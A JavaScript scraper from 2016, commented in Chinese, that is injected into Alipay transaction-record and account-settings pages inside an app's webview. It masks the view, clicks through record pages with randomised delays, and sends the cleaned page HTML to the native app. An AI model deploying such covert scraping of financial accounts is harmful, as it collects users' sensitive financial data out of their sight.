// 名称：takenDataForAlipay.js
// 版本：1.0
// 时间：2016.9

// ------------------------------------------------------------

// 用法-格式
// 在支付宝页面注入js代码。

(function() {
    var url = location.href;
	// 调节手机适配
    toMobile();

    xt();

    // 验证码
	//consumeprod.alipay.com/record/checkSecurity.htm?securityId=web%7Cconsumeprod_record_list%7Cc1cf97a3-5443-41fd-9179-325477e260b6GZ00&consumeVersion=standard

	// 不是交易记录和账户设置页面不抓取
	if(!(/consumeprod.alipay.com\/record\/standard.htm/.exec(url) || /custweb.alipay.com\/account\/index.htm/.exec(url))) return;

    // 初始native请求列队间隔时间
    var initQueue = queue(100);

    // 告诉native我开始抓数据了要他把webview遮掉
    initQueue(always(reNative, ['start']));

    // 初始localStorage.num
    if (!localStorage.num) localStorage.num = 1;

    if (/custweb.alipay.com\/account\/index.htm/.exec(url)) {
        // 在账户设置页面
        delete localStorage.num;
    	// 处理原始数据
    	var af = dataFilter();

    	initQueue(always(reNative, ['work', encodeURIComponent(af())]));

    	// 告诉native全部抓完了
    	initQueue(always(reNative, ['finished']));

    	return;
    }

    var jx = JSON.parse(localStorage.num);


    if (jx < 4) {
        // 交易记录页面

        // 失败
        // initQueue(always(reNative, ['failed']));
        
        // 处理原始数据
        var af = dataFilter();
        initQueue(always(reNative, ['work', encodeURIComponent(af())]));

        // 累计去下一页下一页
		localStorage.num = ++jx;

		// 去下一页交易记录，只抓2页
		if (document.querySelector('.page-next.page-trigger')) document.querySelector('.page-next.page-trigger').click(); else {
			// 这个是像我这种支付宝没有记录的人

			// 去账户设置页面
            setTimeout(function() {
                document.querySelectorAll('.subnav')[2].children[0].children[0].click();
            }, nm(1000, 4000));
		}
        setTimeout(function() {
            document.querySelector('.page-next.page-trigger').click();
        }, nm(2000, 11000));
        
    } else {
        // 在用户设置页面删除
        delete localStorage.num;

        // 去账户设置页面
        document.querySelectorAll('.subnav')[2].children[0].children[0].click();


    }


})();



// 拿到的数据过处理下

function dataFilter(txt) {

    var oldTxt = txt || document.body.innerHTML;

    // alert('本页的原始已经抓到，需要处理下，请稍等。。。');
    return function() {
        
        var arr = [
            // 删除不要的标签

            // 除去换行
            /\n/g,
            // 干掉style
            /<style.*?>.{0,}?<\/style>/g,
            // 干掉js
            /<script.*?>.{0,}?<\/script>/g,
            // 干掉img
            /<img.{0,}?>/g,
            // 去掉注释
            /<!--.+?-->/g,
            // 去掉form表单
            /<form.*?<\/form>/g,

            // 删除不需要的属性

            // 删除行内样式
            /style=".*?"/g,
            // 删除链接
            /href=".*?"/g,
            // 删除自定义属性
            /data-.*?=".*?"/g

        ];

        // 初始替换内容为空格
        var ir1 = initRep('');

        arr.forEach(function(that) {
            oldTxt = ir1(that, oldTxt);
        });

        oldTxt = oldTxt.replace(/\s{2,}/g, ' ');

        return oldTxt;

    };
}


// 纯净版native请求
function reNative(act, data) {
    var ifr = document.getElementById('ifr');
    if(ifr) ifr.parentNode.removeChild(ifr);
    var div = document.createElement('div');
    var iframe = '<iframe id="iframe"></iframe>';
    div.id = 'ifr';
    div.style.display = 'none';
    div.innerHTML = iframe;
    document.body.appendChild(div);
    data = data ? '?data=' + data : '';
    document.getElementById('iframe').contentWindow.window.location = 'js://com.renwohua.conch/crawler/' + act + data;
}

// always函数 存一个变量的状态
function always(val, arr) {
    return function() {
        return Array.isArray(arr) ? val.apply(null, arr) : val;
    };
}


// 简陋的列队
function queue(time) {
    return (function(arr, t) {
        return function(fn) {
            arr.push(fn);
            setTimeout(function() {
                arr[0]();
                arr.shift();
            }, ++t * time);
        }
    })([], 0);
}

// 配置初始替换内容
function initRep(txt) {
    return function(rex, str) {
        return str.replace(rex, txt);
    };
}

// 让pc页面在手机上看得清
function toMobile() {

    var mt = document.createElement('meta');
    mt.name = 'viewport';
    mt.content = 'width=device-width, initial-scale=1, maximum-scale=1';
    document.querySelector('head').appendChild(mt);
}

// 页面上显示提示信息
function xt(callback) {
	var t1 = document.createElement('div');
	t1.innerHTML = '请登陆您的交易记录页面进行认证！';
	document.body.appendChild(t1);
	t1.style.cssText = 'z-index:1000;top:0;left:0;box-shadow:0 0 2px 2px #000;background-color:#f73e3e;color:#fff;border:1px solid #fff;line-heigth:20px;width:100%;text-align:center;font-size:14px;position:absolute;'

	window.onscroll = function() {
		t1.style.cssText = 'top:' + (document.body.scrollTop || document.documentElement.scrollTop) + 'px;left:' + (document.body.scrollLeft || document.documentElement.scrollLeft) + 'px;z-index:1000;box-shadow:0 0 2px 2px #000;background-color:#f73e3e;color:#fff;border:1px solid #fff;line-heigth:30px;width:100%;text-align:center;font-size:14px;position:absolute;';
	};
}

// n到m之间的随机数
function nm(n,m) {
    return parseInt(n + Math.random() * (m - n));
}




